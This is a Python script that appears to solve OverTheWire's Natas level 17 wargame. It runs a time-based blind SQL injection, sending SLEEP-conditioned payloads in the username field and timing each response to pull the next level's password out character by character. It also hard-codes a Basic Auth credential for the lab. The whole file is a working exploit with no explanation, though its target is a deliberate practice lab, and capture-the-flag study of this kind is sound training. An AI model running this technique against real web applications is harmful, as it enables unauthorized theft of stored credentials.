#!/usr/bin/env python3

import string
import requests
import time

URL = "http://natas17.natas.labs.overthewire.org/index.php?debug=1"


CHARSET = string.ascii_letters + string.digits

session = requests.Session()
session.headers.update({"Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="})


def found_password(prefix: str) -> bool:
    # payload = f'natas16" AND password LIKE BINARY "{prefix}%" #'
    payload = f'natas18" AND IF(password LIKE BINARY "{prefix}%", SLEEP(1), 0) -- -'
    print("trying", payload)
    t0 = time.perf_counter()
    resp = session.post(URL, data={"username": payload}, timeout=10)
    dt = time.perf_counter() - t0
    print("dt=", dt)
    if dt >= 0.5:
        print("[^] Time Delay signal", dt, prefix)
        return True


def guess_password(max_length: int = 64) -> str:
    password = ""
    for _ in range(max_length):
        for ch in CHARSET:
            test_prefix = password + ch
            if found_password(test_prefix):
                password = test_prefix
                print(f"[+] Found char: {ch} -> {password}")
                break
        else:
            break
    return password


if __name__ == "__main__":
    pwd = guess_password(max_length=32)
    print(f"\nRecovered password (partial if interrupted): {pwd}")
